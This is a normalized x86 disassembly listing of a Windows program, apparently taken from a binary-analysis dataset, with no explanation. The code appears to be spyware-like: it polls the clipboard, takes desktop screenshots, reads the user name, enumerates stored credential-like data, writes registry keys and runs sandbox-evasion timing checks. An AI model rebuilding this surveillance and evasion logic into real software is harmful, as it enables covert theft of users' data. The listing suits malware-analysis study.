je r-xdata
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push [ esp + 0x30 ]
call [ wsprintfW@IAT ]
add esp 0x14
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
push ecx
push ecx
push ecx
lea ecx [ esp + 0x28 ]
push ecx
call eax
test eax eax
je r-xdata
mov esi [ esp + 0x20 ]
call sub_40cd50
mov [ esp + 0x4c ] 0x0
lea esi [ esp + 0x20 ]
call sub_40c938
or [ esp + 0x4c ] 0xffffffff
lea esi [ esp + 0x30 ]
call sub_40c938
mov ecx [ esp + 0x44 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0x1c ]
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push [ esp + 0x34 ]
call [ wsprintfW@IAT ]
add esp 0x18
jmp r-xdata
sub_414eb2
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov esi rw-data
call sub_40c90c
mov esi [ esp + 0x14 ]
push esi
push sub_414d3f
push 0x1
push 0x1
push r--data
mov edx 0x80000001
mov ecx esi
call sub_40c30b
mov eax [ rw-data ]
mov edi [ rw-data ]
push eax
push 0x0
push 0x3e8
mov ebx eax
call sub_40ed22
push eax
push 0x0
push 0x80361901
push ebx
push edi
call sub_40ffc9
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
sub_414f1c
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
call sub_40be17
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40f058
call sub_40f4b7
push r--data
call sub_40fae9
push r--data
call sub_40fae9
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
call sub_40e661
call sub_40e23a
call sub_412ae3
cmp eax 0x309
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov esi eax
test esi esi
je r-xdata
call sub_40f066
push 0x0
push esi
call [ LocalFree@IAT ]
mov ebx edi
call sub_40f41d
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x58bc ] bl
je r-xdata
call sub_40f2f5
call sub_40f394
push edi
call sub_40f6c2
test al al
jne r-xdata
call sub_40ee0e
push ebx
jmp r-xdata
push edi
call sub_40f884
test al al
jne r-xdata
call [ ExitProcess@IAT ]
mov esi 0xb40
push 0x1388
call [ Sleep@IAT ]
dec esi
jne r-xdata
sub_414ff2
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x13ec
call sub_406c70
push ebx
push esi
push edi
lea eax [ esp + 0x44 ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ LocalFree@IAT ]
mov edi [ Sleep@IAT ]
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] 0xfa
cmp [ esp + 0x44 ] 0x2
jle r-xdata
push 0x0
call edi
mov eax [ esp + 0x1c ]
mov al [ eax ]
mov cl [ esp + 0x2c ]
add [ esp + 0x2c ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x1c ]
inc esi
cmp [ esp + 0x2c ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x14 ]
jne r-xdata
call sub_40f29b
mov eax [ esp + 0x44 ]
add eax 0xfffffffe
push eax
lea ebx [ esi + 0x8 ]
call sub_40ef9e
test al al
je r-xdata
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x13 ] 0x0
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x74 ]
push eax
mov [ esi + 0x2 ] 0x0
mov [ esp + 0x28 ] 0x200
call [ GetUserNameW@IAT ]
call [ GetCommandLineW@IAT ]
xor ecx ecx
push 0x0
call [ ExitProcess@IAT ]
cmp [ eax + edx * 2 ] 0x0
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
lea eax [ esp + 0x50 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x54 ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov esi [ GetVersionExW@IAT ]
lea eax [ esp + 0x70 ]
push eax
call esi
call sub_40e9bf
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x70 ]
push eax
call esi
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x14 ] 0xfa
add ecx 0xa
cmp ecx 0xc8
jl r-xdata
push 0x0
call edi
mov eax [ esp + 0x30 ]
mov al [ eax ]
mov cl [ esp + 0x1c ]
add [ esp + 0x1c ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x30 ]
inc esi
cmp [ esp + 0x1c ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x14 ]
jne r-xdata
mov edx ecx
and edx 0x80000001
jns r-xdata
mov [ esp + 0x1c ] 0x2
mov [ esp + 0x13 ] 0x0
mov [ esi + 0x2 ] 0x0
mov [ esp + 0x14 ] 0x1
call sub_40e9bf
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
inc esi
cmp esi 0x8
jle r-xdata
push 0x0
call [ GetKeyboardType@IAT ]
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0xfa
fild [ esp + 0x14 ]
xor esi esi
inc esi
mov [ esp + 0x18 ] esi
fdiv [ r--data ]
fsub [ r--data ]
fmul [ r--data ]
fstp [ esp + 0x48 ]
jmp r-xdata
push 0x1
call edi
push 0x0
call edi
call sub_40e9bf
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
push 0x0
call edi
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl [ esp + 0x14 ]
add [ esp + 0x14 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x18 ]
inc esi
cmp [ esp + 0x14 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
fild [ esp + 0x18 ]
push esi
fdiv [ r--data ]
fsub [ r--data ]
fmul [ r--data ]
fsub [ r--data ]
fstp [ esp + 0x34 ]
call edi
push 0x0
call edi
fldz
fst [ esp + 0x38 ]
mov [ esp + 0x1c ] esi
fstp [ esp + 0x20 ]
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x13 ] 0x0
mov [ esi + 0x2 ] 0x0
call sub_40f29b
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x5768 ] ecx
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0xfa
call sub_40e9bf
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
fld [ esp + 0x38 ]
fmul [ esp + 0x38 ]
fld [ esp + 0x20 ]
fmul [ esp + 0x20 ]
fsubp st1
fadd [ esp + 0x30 ]
fld [ esp + 0x38 ]
fadd st0
fmul [ esp + 0x20 ]
fadd [ esp + 0x48 ]
fstp [ esp + 0x20 ]
fst [ esp + 0x38 ]
fld st0
fmulp st1
fld [ esp + 0x20 ]
fmul [ esp + 0x20 ]
faddp st1
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
push 0x0
call edi
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl [ esp + 0x14 ]
add [ esp + 0x14 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x18 ]
inc esi
cmp [ esp + 0x14 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
call sub_40e9bf
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
lea eax [ esp + 0x60 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x64 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x38 ] eax
mov [ esp + 0x20 ] 0xfa
inc [ esp + 0x1c ]
cmp [ esp + 0x1c ] 0x64
jl r-xdata
mov [ esp + 0x1c ] 0x1869f
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x13 ] 0x0
mov [ esi + 0x2 ] 0x0
call sub_40f29b
call sub_414f1c
lea eax [ esp + 0x70 ]
lea esi [ esp + 0x458 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] 0xfa
inc [ esp + 0x14 ]
cmp [ esp + 0x14 ] 0x141
jle r-xdata
push 0x0
call edi
mov eax [ esp + 0x38 ]
mov al [ eax ]
mov cl [ esp + 0x30 ]
add [ esp + 0x30 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x38 ]
inc esi
cmp [ esp + 0x30 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
call sub_40e9bf
sub eax [ esp + 0x2c ]
cmp eax 0xa
ja r-xdata
push 0x0
call edi
mov eax [ esp + 0x18 ]
mov al [ eax ]
mov cl [ esp + 0x14 ]
add [ esp + 0x14 ] 0x2
and al 0xc0
shr al cl
or [ esp + 0x13 ] al
inc [ esp + 0x18 ]
inc esi
cmp [ esp + 0x14 ] 0x5
jl r-xdata
inc esi
dec [ esp + 0x20 ]
jne r-xdata
xor esi esi
inc esi
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x13 ] 0x0
push 0x1a
mov [ esi + 0x2 ] 0x0
pop esi
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x13 ] 0x0
pop edi
mov [ esi + 0x2 ] 0x0
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x74 ]
push eax
mov [ esp + 0x28 ] 0x214
call [ GetUserNameW@IAT ]
dec esi
jne r-xdata
cmp [ esp + 0x1c ] 0x1869f
jge r-xdata
call [ GetCommandLineW@IAT ]
xor ecx ecx
cmp [ eax + edx * 2 ] 0x0
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc [ esp + 0x18 ]
cmp [ esp + 0x18 ] 0xaa
jle r-xdata
inc ecx
cmp ecx 0x14
jl r-xdata
xor esi esi
inc esi
mov edx ecx
and edx 0x80000001
jns r-xdata
sub_4154a1
mov eax sub_41ab75
call sub_416a8c
sub esp 0x1c
push esi
push edi
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x14 ] 0x0
push [ ebp + 0xc ]
call sub_412634
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x14 ] edi
call sub_40c9fb
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_412682
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x24 ]
call sub_40c938
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x10
push [ ebp + 0xc ]
mov eax esi
call sub_412706
sub_415516
mov eax sub_41ab90
call sub_416a8c
sub esp 0x20
push ebx
push esi
push edi
mov edi rw-data
push edi
mov [ ebp - 0x18 ] edi
call sub_412634
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x28 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
call sub_4125dc
call sub_40f29b
mov ebx rw-data
mov eax 0x580
mov ecx ebx
call sub_40ce6c
push 0x1
push eax
mov [ ebp - 0x14 ] eax
call sub_40c865
call sub_40f29b
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor al al
push 0x580
push [ ebp - 0x28 ]
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_4101be
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x28 ]
call sub_40c938
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push edi
lea eax [ ebp - 0x28 ]
call sub_412706
test al al
je r-xdata
sub_4155b9
mov eax sub_41ac5f
call sub_416a8c
push ecx
test [ rw-data ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
leave
retn
or [ rw-data ] 0x1
and [ ebp - 0x4 ] 0x0
call sub_415516
push sub_41bc10
call sub_4023d4
pop ecx
or [ ebp - 0x4 ] 0xffffffff
sub_4155fd
push ecx
push ecx
push ebx
push ebp
push esi
xor ebp ebp
push edi
xor esi esi
push 0x7530
call [ Sleep@IAT ]
jmp r-xdata
push 0xd
call [ GetClipboardData@IAT ]
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
call [ CloseClipboard@IAT ]
push eax
call [ GlobalLock@IAT ]
mov edi eax
test edi edi
je r-xdata
push [ esp + 0x14 ]
call [ GlobalUnlock@IAT ]
push edi
call [ lstrlenW@IAT ]
mov ebx eax
test ebp ebp
je r-xdata
lea esi [ ebx + ebx ]
push esi
push 0x0
push 0x32
call sub_40ed22
push eax
push 0x0
push 0x74447101
push esi
mov esi [ esp + 0x38 ]
push edi
call sub_40ffc9
push ebp
call sub_412d05
call sub_40e7b9
mov ebp eax
mov esi ebx
cmp esi ebx
jne r-xdata
push ebp
push edi
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
sub_4156a1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
push ebx
push esi
push edi
mov esi rw-data
push esi
call sub_40ca1c
lea eax [ esp + 0x10 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jne r-xdata
call sub_40f29b
call sub_40e7b9
push eax
push esi
call sub_40cce2
inc [ rw-data ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x1c ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov edi [ eax * 4 + rw-data ]
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
lea edx [ esp + 0x1c ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov ebx [ CoTaskMemFree@IAT ]
cmp [ esp + 0x20 ] 0x0
je r-xdata
call sub_40f29b
mov edi [ esp + 0x1c ]
call sub_40e7b9
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
lea edx [ esp + 0x1c ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x20 ]
call ebx
push [ esp + 0x1c ]
call ebx
push eax
push esi
call sub_40cce2
cmp [ esp + 0x1c ] 0x0
je r-xdata
sub_4157af
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ae53
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
push ebx
push esi
push edi
lea esi [ esp + 0x58 ]
call sub_40c9fb
xor esi esi
mov [ esp + 0x74 ] esi
mov [ esp + 0xc ] esi
call sub_40f29b
cmp [ ebp + 0x8 ] esi
je r-xdata
or [ esp + 0x74 ] 0xffffffff
lea esi [ esp + 0x58 ]
call sub_40c938
mov ecx [ esp + 0x6c ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push esi
push [ ebp + 0xc ]
mov ebx 0x80000001
push [ ebp + 0x8 ]
lea edi [ esp + 0x18 ]
push ebx
call sub_40c4dc
test al al
je r-xdata
push esi
push [ esp + 0x10 ]
lea esi [ esp + 0x60 ]
call sub_40c865
test al al
je r-xdata
call sub_40f29b
mov esi [ esp + 0x58 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call sub_40c4dc
test al al
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x40 ] eax
mov eax [ rw-data ]
shr eax 0x2
xor ebx ebx
xor edi edi
mov [ esp + 0x44 ] esi
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
mov [ esp + 0x18 ] esi
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
inc edi
shr eax 0x2
cmp edi eax
jl r-xdata
mov ecx [ esi + 0x80 ]
mov [ esp + 0x3c ] ecx
push [ esi + 0x80 ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x30 ]
push eax
push 0x1
push ebx
push ebx
lea eax [ esp + 0x48 ]
push eax
push ebx
lea eax [ esp + 0x58 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ eax + 0xc ] 0x4b434957
je r-xdata
mov edi [ eax ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
add ecx edi
add ecx edx
cmp [ esp + 0x30 ] ecx
jb r-xdata
push eax
call [ LocalFree@IAT ]
add edi edx
lea edx [ eax + 0x14 ]
add edi eax
test [ edx ] 0xfffffffe
lea ecx [ eax + 0x24 ]
mov [ esp + 0x14 ] edi
mov [ esp + 0xc ] ebx
mov [ esp + 0x2c ] edx
jbe r-xdata
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov ebx [ ecx ]
add eax edi
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x80 ]
add ecx 0x20
add ebx edi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] eax
call sub_40f29b
lea esi [ esp + 0x48 ]
mov [ esp + 0x28 ] eax
call sub_40c9fb
mov [ esp + 0x74 ] 0x1
xor esi esi
cmp ebx esi
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x4c ]
mov [ esp + 0x24 ] 0x77010101
call sub_40cb2c
push r--data
lea eax [ esp + 0x4c ]
push eax
call sub_40ccf8
push esi
lea eax [ esp + 0x4c ]
push eax
call sub_40ccf8
push [ esp + 0x24 ]
lea eax [ esp + 0x4c ]
push eax
call sub_40ccf8
push ebx
lea eax [ esp + 0x4c ]
push eax
call sub_40ccf8
push [ esp + 0x10 ]
lea eax [ esp + 0x4c ]
push eax
call sub_40ccf8
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x4c ]
mov [ esp + 0x28 ] esi
call sub_40cb2c
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x4c ]
mov [ esp + 0x28 ] esi
call sub_40cb2c
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x4c ]
mov [ esp + 0x28 ] esi
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x4c ]
push eax
call sub_40cce2
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x4c ]
mov [ esp + 0x28 ] 0x3
call sub_40cb2c
push [ 0x4 ]
lea eax [ esp + 0x4c ]
push eax
call sub_40cce2
mov edi [ 0x4 ]
cmp edi esi
jle r-xdata
cmp [ esp + 0x10 ] esi
jne r-xdata
push esi
lea eax [ esp + 0x4c ]
push eax
call sub_40ccf8
push [ esp + 0x4c ]
lea eax [ esp + 0x4c ]
push eax
call sub_40cccc
push [ esp + 0x4c ]
push esi
push 0x64
call sub_40ed22
push eax
push esi
mov esi [ esp + 0x3c ]
push 0xff0f8211
push [ esp + 0x64 ]
push [ esp + 0x64 ]
call sub_40ffc9
mov [ esp + 0x74 ] 0x0
lea esi [ esp + 0x48 ]
call sub_40c938
mov edi [ esp + 0x14 ]
push [ 0x0 ]
lea eax [ esp + 0x4c ]
call sub_40cb2c
mov [ esp + 0x74 ] 0x0
lea esi [ esp + 0x48 ]
call sub_40c938
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
mov eax [ esp + 0x2c ]
mov eax [ eax ]
inc [ esp + 0xc ]
shr eax 0x1
cmp [ esp + 0xc ] eax
jb r-xdata
sub_415ada
push ebp
mov ebp esp
sub esp 0x3c
and [ ebp - 0x8 ] 0x0
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
xor esi esi
mov [ rw-data ] eax
cmp eax esi
je r-xdata
xor al al
push 0xf0000000
push 0x1
push esi
push esi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] esi
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
shr eax 0x2
mov [ ebp - 0x10 ] esi
test eax eax
jle r-xdata
push esi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
push sub_40f29b
push sub_4157af
push 0x1
push 0x1
push r--data
call sub_40f29b
mov edx 0x80000001
mov ecx eax
call sub_40c30b
push rw-data
call sub_40ca1c
mov al 0x1
jmp r-xdata
mov ebx [ wsprintfW@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
inc [ ebp - 0x10 ]
shr eax 0x2
cmp [ ebp - 0x10 ] eax
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push esi
push esi
push 0x8004
push [ ebp - 0x8 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x10 ]
mov edi [ eax + ecx * 4 ]
cmp edi esi
je r-xdata
push esi
push edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push edi
push [ ebp - 0xc ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push 0x2
push [ ebp - 0xc ]
mov [ ebp - 0x14 ] 0x14
call [ CryptGetHashParam@IAT ]
test eax eax
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyHash@IAT ]
call sub_40f29b
mov eax 0x84
call sub_412da8
mov esi eax
xor eax eax
mov [ esi + 0x80 ] edi
mov [ esi ] ax
mov [ ebp - 0x1 ] al
xor edi edi
mov al [ ebp + edi - 0x38 ]
add [ ebp - 0x1 ] al
movzx eax al
push eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
push esi
call [ lstrcatW@IAT ]
inc edi
cmp edi 0x14
jl r-xdata
movzx eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
push esi
call [ lstrcatW@IAT ]
push esi
push rw-data
call sub_40cce2
xor esi esi
sub_415c93
push ecx
push ebx
push 0x0
call [ CoInitialize@IAT ]
call sub_4156a1
call sub_415ada
push rw-data
mov bl al
call sub_40ca1c
call [ CoUninitialize@IAT ]
mov al bl
pop ebx
pop ecx
retn
sub_415cbe
mov eax sub_41ac47
call sub_416a8c
sub esp 0x8c
push ebx
push esi
push edi
lea esi [ ebp - 0x34 ]
call sub_40c9fb
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call sub_40d0df
cmp eax 0x28
jle r-xdata
call [ GetProcessWindowStation@IAT ]
mov [ ebp - 0x24 ] eax
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x78 ]
push eax
push 0xc
lea eax [ ebp - 0x94 ]
push eax
push 0x1
push [ ebp - 0x24 ]
call [ GetUserObjectInformationW@IAT ]
call [ GetDesktopWindow@IAT ]
mov esi [ GetDC@IAT ]
push eax
mov [ ebp - 0x20 ] eax
call esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x20 ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x7c ]
push [ ebp - 0x14 ]
mov edi [ ebp - 0x80 ]
mov [ ebp - 0x10 ] eax
call [ CreateCompatibleDC@IAT ]
push [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
push edi
push [ ebp - 0x14 ]
call [ CreateCompatibleBitmap@IAT ]
push eax
push [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
call [ SelectObject@IAT ]
push 0x40cc0020
push ebx
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push edi
push ebx
push ebx
push [ ebp - 0x1c ]
call [ BitBlt@IAT ]
push ebx
call esi
push 0x2c
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x74 ]
push ebx
push eax
call sub_405830
mov edi [ GetDIBits@IAT ]
add esp 0xc
push ebx
lea eax [ ebp - 0x74 ]
push eax
push ebx
push ebx
push ebx
push [ ebp - 0x18 ]
mov [ ebp - 0x74 ] 0x28
push [ ebp - 0x10 ]
call edi
mov eax [ ebp - 0x60 ]
cmp eax ebx
ja r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x34 ]
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push 0x1
push eax
lea esi [ ebp - 0x34 ]
call sub_40c865
push ebx
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x34 ]
mov [ ebp - 0x64 ] ebx
push [ ebp - 0x6c ]
push ebx
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
call edi
xor eax eax
mov [ ebp - 0x42 ] ax
mov [ ebp - 0x40 ] ax
mov eax [ ebp - 0x60 ]
add eax 0x36
mov [ ebp - 0x46 ] eax
mov eax 0x4d42
mov [ ebp - 0x48 ] ax
lea eax [ ebp - 0x74 ]
push eax
push 0x28
pop edi
mov eax esi
mov [ ebp - 0x3e ] 0x36
call sub_40cae3
lea eax [ ebp - 0x48 ]
push eax
push 0xe
pop edi
mov eax esi
call sub_40cae3
push [ ebp - 0x30 ]
push ebx
push 0x5
call sub_40ed22
mov esi [ ebp + 0x8 ]
push eax
push ebx
push 0x79339801
push [ ebp - 0x30 ]
push [ ebp - 0x34 ]
call sub_40ffc9
mov esi [ ReleaseDC@IAT ]
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp - 0x6c ] ebx
jge r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp - 0x10 ]
push ebx
call esi
movzx eax [ ebp - 0x66 ]
add eax 0x7
imul eax [ ebp - 0x70 ]
imul eax [ ebp - 0x6c ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ebp - 0x60 ] eax
neg [ ebp - 0x6c ]
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x20 ]
call esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ DeleteDC@IAT ]
push [ ebp - 0x24 ]
call [ SetProcessWindowStation@IAT ]
push [ ebp - 0x38 ]
call [ SetThreadDesktop@IAT ]
lea esi [ ebp - 0x34 ]
call sub_40c90c
mov bl 0x1
jmp r-xdata
push [ ebp - 0x18 ]
call [ DeleteObject@IAT ]
sub_415f1d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x664
push ebx
push esi
push edi
xor eax eax
mov esi 0x206
push esi
push eax
mov [ esp + 0x18 ] ax
lea eax [ esp + 0x1a ]
push eax
call sub_405830
add esp 0xc
xor eax eax
push esi
push eax
mov [ esp + 0x220 ] ax
lea eax [ esp + 0x222 ]
push eax
call sub_405830
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
mov ebx r--data
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0x14 ]
push eax
call esi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call edi
push r--data
lea eax [ esp + 0x21c ]
push eax
call esi
lea eax [ esp + 0x420 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ FindClose@IAT ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x424 ]
call sub_401432
pop ecx
mov ebx eax
mov esi rw-data
call sub_4014d5
test al al
je r-xdata
lea eax [ esp + 0x420 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call sub_415efb
pop ecx
pop ecx
call sub_40f29b
mov eax esi
call sub_410115
